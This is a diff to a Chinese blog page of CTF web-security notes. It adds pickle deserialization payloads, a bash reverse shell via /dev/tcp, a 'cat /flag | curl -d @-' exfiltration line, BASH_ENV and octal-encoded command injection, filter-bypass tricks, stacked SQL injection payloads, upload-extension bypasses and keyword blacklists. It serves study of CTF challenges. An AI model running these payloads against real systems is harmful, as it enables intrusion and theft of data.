@@ -311,7 +311,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 14 分钟
+                    阅读时长: 17 分钟
                 </time>
                 <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z"/>
@@ -322,7 +322,7 @@
 
 
                 <time class="article-words">
-                    6545 字
+                    8207 字
                 </time>
             </div>
         
@@ -618,6 +618,28 @@
 </span></span><span class="line"><span class="cl"><span class="c1"># python在局部改变全局变量时需要声明 global</span>
 </span></span></code></pre></td></tr></table>
 </div>
+</div><p><strong>过滤</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">pickle_data</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="p">{</span><span class="s2">&#34;os&#34;</span><span class="p">,</span><span class="s2">&#34;system&#34;</span><span class="p">,</span><span class="s2">&#34;eval&#34;</span><span class="p">,</span><span class="s2">&#34;setstate&#34;</span><span class="p">,</span><span class="s2">&#34;globals&#34;</span><span class="p">,</span><span class="s1">&#39;exec&#39;</span><span class="p">,</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">,</span><span class="s1">&#39;template&#39;</span><span class="p">,</span> <span class="s1">&#39;render&#39;</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\\</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;compile&#39;</span><span class="p">,</span><span class="s1">&#39;requests&#39;</span><span class="p">,</span><span class="s1">&#39;exit&#39;</span><span class="p">,</span><span class="s1">&#39;pickle&#39;</span><span class="p">,</span><span class="s2">&#34;class&#34;</span><span class="p">,</span><span class="s2">&#34;mro&#34;</span><span class="p">,</span><span class="s2">&#34;flask&#34;</span><span class="p">,</span><span class="s2">&#34;sys&#34;</span><span class="p">,</span><span class="s2">&#34;base&#34;</span><span class="p">,</span><span class="s2">&#34;init&#34;</span><span class="p">,</span><span class="s2">&#34;config&#34;</span><span class="p">,</span><span class="s2">&#34;session&#34;</span><span class="p">}:</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>利用subprocess</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">return</span> <span class="p">(</span><span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">,</span> <span class="p">([</span><span class="s2">&#34;cp&#34;</span><span class="p">,</span> <span class="s2">&#34;/flag&#34;</span><span class="p">,</span> <span class="s2">&#34;/app/app.py&#34;</span><span class="p">],))</span> <span class="c1"># 直接返回命令的标准输出</span>
+</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="p">(</span><span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">,</span> <span class="p">([</span><span class="s2">&#34;bash&#34;</span><span class="p">,</span> <span class="s2">&#34;-c&#34;</span><span class="p">,</span> <span class="s2">&#34;bash -i &gt;&amp; /dev/tcp/$ip/$port 0&gt;&amp;1&#34;</span><span class="p">],))</span> <span class="c1"># 反弹shell</span>
+</span></span></code></pre></td></tr></table>
+</div>
 </div><h3 id="文件包含漏洞">文件包含漏洞</h3>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -757,6 +779,13 @@
 </span><span class="lnt">18
 </span><span class="lnt">19
 </span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-PHP" data-lang="PHP"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
@@ -764,6 +793,7 @@
 </span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="c1">// 关闭所有错误报告
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">session_start</span><span class="p">();</span> <span class="c1">// 允许脚本访问和修改用户的会话数据
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">include</span><span class="p">(</span><span class="s2">&#34;file.file&#34;</span><span class="p">);</span> <span class="c1">// 此文件包含file.file所有变量范围 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">include_once</span> <span class="s2">&#34;xx.php&#34;</span><span class="p">;</span> <span class="c1">// 指定文件载入并执行其中程序，若文件已被包含则不再包含
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>
 </span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="s2">&#34;xx.php&#34;</span><span class="p">);</span> <span class="c1">// 将PHP代码高亮显示在网页
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">isset</span><span class="p">()</span> <span class="c1">// 判断一个变量是否已被设置, 且不为 null
@@ -771,12 +801,18 @@
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$arr</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="nv">$x</span><span class="p">,</span> <span class="s2">&#34;1&#34;</span><span class="p">);</span> <span class="c1">// 数组[ $x, &#34;1&#34; ]
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>
 </span></span><span class="line"><span class="cl"><span class="nx">strpos</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span> <span class="c1">// 返回string在content第一次出现的索引, 否则返回false
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">trim</span><span class="p">(</span><span class="nx">addslashes</span><span class="p">(</span><span class="nv">$v</span><span class="p">));</span> <span class="c1">// 去除首尾空白字符, 对&#34;, &#39;, \, NULL添加反斜杠
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>
 </span></span><span class="line"><span class="cl"><span class="c1">// PHP 数组或对象编码为 JSON 格式的字符串
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">echo</span> <span class="nx">json_encode</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;status&#39;</span> <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;info&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;hello&#39;</span><span class="p">));</span>
 </span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">putenv</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">{</span><span class="nv">$k</span><span class="si">}</span><span class="s2">=</span><span class="si">{</span><span class="nv">$v</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">);</span> <span class="c1">// 定义环境变量
+</span></span></span><span class="line"><span class="cl"><span class="c1"># url传参: ?env[xxx]=`xxx`
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
 </span></span><span class="line"><span class="cl"><span class="nx">unset</span><span class="p">(</span><span class="nv">$arr</span><span class="p">);</span> <span class="c1">// 清除变量
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">exit</span><span class="p">;</span> <span class="c1">// 终止脚本执行
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="nx">system</span><span class="p">(</span><span class="s2">&#34;bash -c &#39;ls&#39;&#34;</span><span class="p">);</span> <span class="c1">// 命令执行
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>
 </span></span><span class="line"><span class="cl"><span class="c1">// 终端 php xx.php 执行
 </span></span></span></code></pre></td></tr></table>
@@ -797,11 +833,23 @@
 </span><span class="lnt">11
 </span><span class="lnt">12
 </span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-PHP" data-lang="PHP"><span class="line"><span class="cl"><span class="c1">// a变量值
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]</span> <span class="c1">// post请求 若为数组某值构造 : a[xxx]=xxx
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]</span>  <span class="c1">// get请求
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">];</span> <span class="c1">// post请求 若为数组某值构造 : a[xxx]=xxx
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">];</span>  <span class="c1">// get请求
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 循环处理
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">foreach</span> <span class="p">(</span><span class="nv">$_POST</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&gt;</span><span class="nv">$v</span><span class="p">);</span> <span class="c1">// $k键, $v值
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="c1">// 黑名单
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$BlackList</span> <span class="o">=</span> <span class="s2">&#34;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/</span><span class="si">{</span><span class="nv">$BlackList</span><span class="si">}</span><span class="s2">/is&#34;</span><span class="p">,</span><span class="nv">$post</span><span class="p">[</span><span class="s1">&#39;query&#39;</span><span class="p">])){};</span> <span class="c1">// s使.可匹配换行符\n防止换行绕过关键字过滤
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>
 </span></span><span class="line"><span class="cl"><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/flag/&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">])</span><span class="c1">// 检查是否存在匹配 flag 的子串
 </span></span></span><span class="line"><span class="cl"><span class="c1">// /flag/i   i 忽略大小写匹配, 即FlaG也会匹配
@@ -915,7 +963,7 @@
 <p>Linux下命令：</p>
 <ul>
 <li>ls替代：<code>dir</code></li>
-<li>空格绕过：<code>&lt;</code>, <code>${IFS}</code>, <code>$IFS$9</code>, <code>%09</code>, <code>&lt;&gt;</code>, <code>&lt;</code>, <code>%20</code></li>
+<li>空格绕过：<code>&lt;</code>, <code>${IFS}</code>, <code>$IFS$9</code>, <code>%09</code>, <code>&lt;&gt;</code>, <code>&lt;</code>, <code>%20</code>, <code>$IFS</code></li>
 <li>cat命令替代：<code>more</code>, <code>tail</code>, <code>head</code>, <code>less</code>, <code>nl</code>, <code>sort</code>, <code>tailf</code></li>
 <li>截断字符替代：<code>&amp;&amp;</code>, <code>||</code>, <code>;</code>, <code>%0a</code>, <code>|</code></li>
 <li>反斜杠绕过：<code>ca\t fl\ag.txt</code></li>
@@ -940,6 +988,44 @@
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat <span class="sb">`</span>ls<span class="sb">`</span> 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>环境变量注入实现命令执行</strong></p>
+<ul>
+<li><code>BASH_ENV</code>：可以在<code>bash -c</code>的时候注入任意命令</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">BASH_ENV</span><span class="o">=</span><span class="s1">&#39;$(id 1&gt;&amp;2)&#39;</span> bash -c <span class="s1">&#39;echo hello&#39;</span> <span class="c1"># 将输入id以及hello</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>注入时对命令中字母进行编码绕过可在Linux下执行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># cat flag 字母转换: oct(ord(&#39;c&#39;))[2:]</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 每个字节前加上$</span>
+</span></span><span class="line"><span class="cl"><span class="s1">$&#39;\143&#39;$&#39;\141&#39;$&#39;\164&#39;</span> <span class="s1">$&#39;\146&#39;$&#39;\154&#39;$&#39;\141&#39;$&#39;\147&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>反弹shell命令</strong></p>
+<ul>
+<li>使用花生壳，内网为kali地址及端口，外部为某域名</li>
+<li>kali中<code>nc -lnvp 5555</code>即可</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat /flag <span class="p">|</span> curl -d @- https://xx.xx.xx.xx:port <span class="c1"># @-表示从标准输入读取, -d指定发送数据</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="远程命令执行">远程命令执行</h3>
@@ -1526,11 +1612,9 @@
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-Plain" data-lang="Plain"><span class="line"><span class="cl">http://target.com/script.php?url=file:///etc/passwd
-</span></span><span class="line"><span class="cl">尝试让服务器本身执行命令
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">http://target.com/script.php?url<span class="o">=</span>file:///etc/passwd <span class="c1">#尝试让服务器本身执行命令</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="文件上传漏洞">文件上传漏洞</h3>
@@ -1613,7 +1697,22 @@
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>上传一句话木马到相应目录中，使用蚁剑连接【url为文件地址，密码为post中数据】</p>
+</div><p><strong>过滤</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$ext</span> <span class="o">=</span> <span class="nx">pathinfo</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">,</span> <span class="nx">PATHINFO_EXTENSION</span><span class="p">);</span> <span class="c1">// 获取扩展名
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$ext</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;x&#39;</span><span class="p">,</span><span class="s1">&#39;x&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">	<span class="k">exit</span><span class="p">(</span><span class="s1">&#39;no&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>上传一句话木马到相应目录中，且该目录可通过URL访问，使用蚁剑连接【url为文件地址，密码为post中数据】</p>
 <p><code>https://www.cnblogs.com/ash-33/p/16397536.html</code>中有一些一句话木马</p>
 <p><strong>图片木马</strong></p>
 <p>在<code>cmd</code>中运行<code>copy pho.png/b+hello.php/a hack.png</code>将图片和php木马结合</p>
@@ -1649,7 +1748,11 @@
 </span></span><span class="line"><span class="cl"><span class="o">-----------------------------</span><span class="mi">1104904014997412098933705552</span><span class="o">--</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="sql注入漏洞">SQL注入漏洞</h3>
+</div><p><strong>php拓展名</strong></p>
+<ul>
+<li><code>.php3</code>，<code>.php4</code>，<code>.php5</code>，<code>.php7</code>，<code>.phtml</code>，<code>.phps</code>，<code>.pht</code></li>
+</ul>
+<h3 id="sql注入漏洞">SQL注入漏洞</h3>
 <p><strong>MySQL中的注释：</strong></p>
 <ul>
 <li><code>#</code>，直接加注释内容，有时需要注意可能被解析为页内跳转，所以使用<code>%23</code></li>
@@ -1657,7 +1760,7 @@
 <li><code>/* */</code>，多行注释符</li>
 <li><code>-+</code>，注释变体</li>
 </ul>
-<p><strong><code>php</code>连接<code>mysql</code></strong></p>
+<p><strong>php连接mysql</strong></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -1674,8 +1777,25 @@
 <pre tabindex="0" class="chroma"><code class="language-PHP" data-lang="PHP"><span class="line"><span class="cl"><span class="nv">$pwd</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pwd&#39;</span><span class="p">];</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$pwd</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$pwd</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    
-</span></span><span class="line"><span class="cl"><span class="nv">$conn</span> <span class="o">=</span> <span class="nx">mysqli_connect</span><span class="p">(</span><span class="s2">&#34;主机名&#34;</span><span class="p">,</span> <span class="s2">&#34;用户名&#34;</span><span class="p">,</span> <span class="s2">&#34;密码&#34;</span><span class="p">,</span> <span class="s2">&#34;数据库名&#34;</span><span class="p">,</span> <span class="nx">端口</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;SELECT * FROM admin WHERE email=&#39;</span><span class="si">$email</span><span class="s2">&#39; AND pwd=&#39;</span><span class="si">$pwd</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$conn</span> <span class="o">=</span> <span class="nx">mysqli_connect</span><span class="p">(</span><span class="s2">&#34;主机名&#34;</span><span class="p">,</span> <span class="s2">&#34;用户名&#34;</span><span class="p">,</span> <span class="s2">&#34;密码&#34;</span><span class="p">,</span> <span class="s2">&#34;数据库名&#34;</span><span class="p">,</span> <span class="nx">端口</span><span class="p">);</span> <span class="c1">// 变量填$password
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nv">$conn</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Mysql connect error&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// 选择数据库
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$selectDB</span> <span class="o">=</span> <span class="nx">mysqli_select_db</span><span class="p">(</span><span class="nv">$conn</span><span class="p">,</span> <span class="nv">$dbName</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="漏洞点">漏洞点</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;SELECT * FROM admin WHERE email=&#39;</span><span class="si">$email</span><span class="s2">&#39; AND pwd=&#39;</span><span class="si">$pwd</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$result</span> <span class="o">=</span> <span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$conn</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysqli_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
@@ -1684,7 +1804,7 @@
 </div>
 </div><p>此处可使用<code>payload</code>：</p>
 <ol>
-<li>万能密码型：<code>admin' or 1 = 1#</code>
+<li>万能密码型：<code>admin' or 1 = 1# </code>
 <ol>
 <li><code>SELECT * FROM admin WHERE email='a@e.com'OR 1 = 1# AND pwd='$pwd'</code></li>
 </ol>
@@ -1700,7 +1820,85 @@
 </ol>
 </li>
 </ol>
-<h4 id="sql操作">SQL操作</h4>
+<p><strong>拼接</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select &#34;</span><span class="o">.</span><span class="nv">$post</span><span class="p">[</span><span class="s1">&#39;query&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;||flag from Flag&#34;</span><span class="p">;</span> <span class="c1">// ||默认为或运算符，未使用预处理语句
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">mysqli_multi_query</span><span class="p">(</span><span class="nv">$conn</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">do</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$res</span> <span class="o">=</span> <span class="nx">mysqli_store_result</span><span class="p">(</span><span class="nv">$conn</span><span class="p">)){</span> <span class="c1">// 获取查询结果
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">while</span><span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysqli_fetch_row</span><span class="p">(</span><span class="nv">$res</span><span class="p">)){</span> <span class="c1">// 逐行获取查询结果并打印
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nx">print_r</span><span class="p">(</span><span class="nv">$row</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">while</span><span class="p">(</span><span class="o">@</span><span class="nx">mysqli_next_result</span><span class="p">(</span><span class="nv">$conn</span><span class="p">));</span> <span class="c1">// 支持多条SQL语句执行
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>查看数据表Flag所有列内容，且添加一个由列flag的值与1拼接/异或后生成的新列获取flag值，视不同sql而不同</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">#</span><span class="w"> </span><span class="o">*</span><span class="p">,</span><span class="mi">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="p">,</span><span class="mi">1</span><span class="o">||</span><span class="n">flag</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">Flag</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+------+-----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">|</span><span class="w">  </span><span class="n">x</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">x</span><span class="w">    </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+------+-----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="o">|</span><span class="w">  </span><span class="n">abc</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mi">1</span><span class="o">||</span><span class="n">abc</span><span class="w">    </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">2</span><span class="w"> </span><span class="o">|</span><span class="w">  </span><span class="n">xyz</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mi">1</span><span class="o">||</span><span class="n">xyz</span><span class="w">    </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+------+-----------+
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>修改||为拼接，将返回1flag{xxx}</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">#</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="k">set</span><span class="w"> </span><span class="n">sql_mode</span><span class="o">=</span><span class="n">PIPES_AS_CONCAT</span><span class="p">;</span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="k">set</span><span class="w"> </span><span class="n">sql_mode</span><span class="o">=</span><span class="n">PIPES_AS_CONCAT</span><span class="p">;</span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="o">||</span><span class="n">flag</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">Flag</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>预处理语句</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">&#34;SELECT ? FROM Flag&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bind_param</span><span class="p">(</span><span class="s2">&#34;s&#34;</span><span class="p">,</span> <span class="nv">$post</span><span class="p">[</span><span class="s1">&#39;query&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="sql操作">SQL操作</h4>
 <p><strong>验证查询返回列</strong></p>
 <ul>
 <li>union select</li>
@@ -1712,7 +1910,7 @@
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="c1"># 报错: The used SELECT statements have a different number of columns
